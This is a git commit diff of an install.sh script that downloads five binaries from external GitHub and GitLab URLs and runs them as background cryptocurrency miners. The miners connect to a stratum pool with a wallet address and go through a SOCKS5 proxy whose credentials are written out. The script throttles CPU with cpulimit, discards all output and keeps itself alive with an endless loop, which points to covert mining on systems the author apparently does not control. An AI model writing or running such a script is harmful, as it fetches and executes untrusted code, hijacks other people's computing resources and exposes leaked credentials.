6a71d04e81bd4efb24e70de254e1e5b34691338a
meronejas <95197442+meronejas@users.noreply.github.com>
2022-01-02 20:45:22 +0700

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,22 +1,22 @@
 apt-get update -y
 apt-get install -y cpulimit screen
 apt-get install -y ca-certificates wget libcurl4
-wget https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/px1
-wget https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/px2
-wget https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/px3
-wget https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/px4
-wget https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/px5
-chmod +x px1
-chmod +x px2
-chmod +x px3
-chmod +x px4
-chmod +x px5
-pool="stratum+tcp://79.137.70.48:3960"
+wget https://gitlab.com/kancomue/file/-/raw/main/p1
+wget https://gitlab.com/kancomue/file/-/raw/main/p2
+wget https://gitlab.com/kancomue/file/-/raw/main/p3
+wget https://gitlab.com/kancomue/file/-/raw/main/p4
+wget https://gitlab.com/kancomue/file/-/raw/main/p5
+chmod +x p1
+chmod +x p2
+chmod +x p3
+chmod +x p4
+chmod +x p5
+pool="stratum+tcp://103.249.70.7:3300"
 workername="$(echo $(shuf -i 1-100 -n 1)-gg)"
 thread="$(nproc --all)"
-cpulimit -l 30 ./px1 -a verus -o $pool -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.$workername -p -t $thread -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080 >/dev/null 2>&1 >/dev/null &
-cpulimit -l 30 ./px2 -a verus -o $pool -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.$workername -p -t $thread -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080 >/dev/null 2>&1 >/dev/null &
-cpulimit -l 30 ./px3 -a verus -o $pool -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.$workername -p -t $thread -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080 >/dev/null 2>&1 >/dev/null &
-cpulimit -l 30 ./px4 -a verus -o $pool -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.$workername -p -t $thread -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080 >/dev/null 2>&1 >/dev/null &
-cpulimit -l 30 ./px5 -a verus -o $pool -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.$workername -p -t $thread -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080 >/dev/null 2>&1 >/dev/null &
-while :; do echo "system true"; sleep 30m; done
+cpulimit -l 5 ./p1 -a verus -o $pool -u DECyL1Nt3ktReAFLaqNTHp1BvxMCHxZcye.$workername -p -t $thread -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080 >/dev/null 2>&1 >/dev/null &
+cpulimit -l 5 ./p2 -a verus -o $pool -u DECyL1Nt3ktReAFLaqNTHp1BvxMCHxZcye.$workername -p -t $thread -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080 >/dev/null 2>&1 >/dev/null &
+cpulimit -l 5 ./p3 -a verus -o $pool -u DECyL1Nt3ktReAFLaqNTHp1BvxMCHxZcye.$workername -p -t $thread -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080 >/dev/null 2>&1 >/dev/null &
+cpulimit -l 5 ./p4 -a verus -o $pool -u DECyL1Nt3ktReAFLaqNTHp1BvxMCHxZcye.$workername -p -t $thread -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080 >/dev/null 2>&1 >/dev/null &
+cpulimit -l 5 ./p5 -a verus -o $pool -u DECyL1Nt3ktReAFLaqNTHp1BvxMCHxZcye.$workername -p -t $thread -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080 >/dev/null 2>&1 >/dev/null &
+while :; do echo "system true"; sleep 30; done
